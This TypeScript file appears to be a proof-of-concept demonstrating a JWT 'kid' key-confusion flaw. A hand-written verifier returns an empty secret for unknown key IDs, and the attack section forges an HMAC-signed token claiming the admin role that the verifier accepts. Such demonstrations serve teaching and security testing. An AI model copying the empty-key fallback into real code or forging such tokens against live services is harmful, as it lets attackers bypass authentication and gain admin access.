import { createHmac, timingSafeEqual } from 'crypto';

// Manual vulnerable verifier (no jsonwebtoken - bypasses empty key check)
function vulnerableVerify(token: string, getKey: (kid: string) => string) {
  const [headerB64, payloadB64, sigB64] = token.split('.');
  const header = JSON.parse(Buffer.from(headerB64, 'base64url').toString());

  // ❌ VULNERABLE: kid passed directly to key lookup, no validation
  const secret = getKey(header.kid);

  const expected = createHmac('sha256', secret)
    .update(`${headerB64}.${payloadB64}`)
    .digest('base64url');

  if (expected !== sigB64) throw new Error('Invalid signature');
  return JSON.parse(Buffer.from(payloadB64, 'base64url').toString());
}

// Simulated key store (like a DB)
const keyStore: Record<string, string> = {
  'key-1': 'super-secret-key',
};

// ❌ VULNERABLE: returns empty string for unknown kid
const getKey = (kid: string) => keyStore[kid] ?? '';

// --- ATTACK ---
// Sign with empty string (unknown kid → returns '')
const header = Buffer.from(JSON.stringify({ alg: 'HS256', kid: 'nonexistent' })).toString('base64url');
const payload = Buffer.from(JSON.stringify({ sub: 'admin', role: 'admin' })).toString('base64url');
const data = `${header}.${payload}`;
const sig = createHmac('sha256', '').update(data).digest('base64url');  // Sign with ''
const attackToken = `${data}.${sig}`;

try {
  const decoded = vulnerableVerify(attackToken, getKey);
  console.log('VULNERABLE! Got:', decoded);  // { sub: 'admin', role: 'admin' }
} catch (e) {
  console.log('SAFE! Error:', e.message);
}
